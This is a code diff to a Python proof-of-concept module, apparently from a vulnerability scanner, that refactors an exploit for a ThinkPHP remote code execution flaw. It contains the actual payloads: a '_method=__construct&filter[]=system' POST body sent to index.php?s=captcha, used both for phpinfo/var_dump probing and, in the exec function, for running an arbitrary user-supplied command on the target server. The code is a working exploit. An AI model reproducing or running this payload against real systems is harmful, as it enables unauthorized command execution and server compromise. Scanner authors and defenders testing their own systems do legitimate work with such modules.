@@ -29,14 +29,8 @@ class POC(Script):
         if self.base_url:
             headers ={}
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, 'public/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './public/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for poc in ['_method=__construct&method=get&filter[]=phpinfo&server[REQUEST_METHOD]=1',
                                 '_method=__construct&method=get&filter[]=var_dump&server[REQUEST_METHOD]=this_is_a_test']:
                         url = path + 'index.php?s=captcha'
@@ -51,18 +45,13 @@ class POC(Script):
 
     async def exec(self):
         await self.get_url()
+        cmd = self.parameter['cmd']
         if self.base_url:
             headers ={ }
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
-            poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]=%s' %parse.quote_plus(data['cmd'])
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, 'public/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './public/'),
-            ]))
+            poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]=%s' %parse.quote_plus(cmd)
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for pocpath in ['index.php?s=captcha']:
                         url = path + pocpath
                         async with session.post(url=url, data=poc, headers=headers) as res:
